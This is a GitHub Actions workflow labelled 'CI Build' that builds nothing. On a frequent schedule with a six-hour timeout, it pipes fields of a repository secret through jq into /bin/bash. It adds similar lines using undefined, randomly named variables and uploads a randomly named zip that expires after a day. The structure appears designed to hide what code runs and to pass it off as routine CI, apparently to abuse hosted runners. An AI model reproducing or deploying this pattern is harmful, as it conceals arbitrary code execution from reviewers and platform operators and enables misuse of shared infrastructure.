name: CI Build
on:
  workflow_dispatch:

  schedule:
    - cron: '57 4,10,16,22 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  perform:
    name: Run build
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Run build
        env:
          uc52: ${{ secrets.uc52 }}
        run: |
          printf '%s' "$uc52" | jq -r .s5 | /bin/bash
          echo $eogk7819 | jq -r .g05 | /bin/bash
          printf '%s' "$xzyeh18285" | jq -r .cat3 | /bin/bash
          echo $zbo2 | jq -r .h5 | /bin/bash

      - name: Save archive
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: mhsjF3Na
          path: "*.zip"
          retention-days: 1
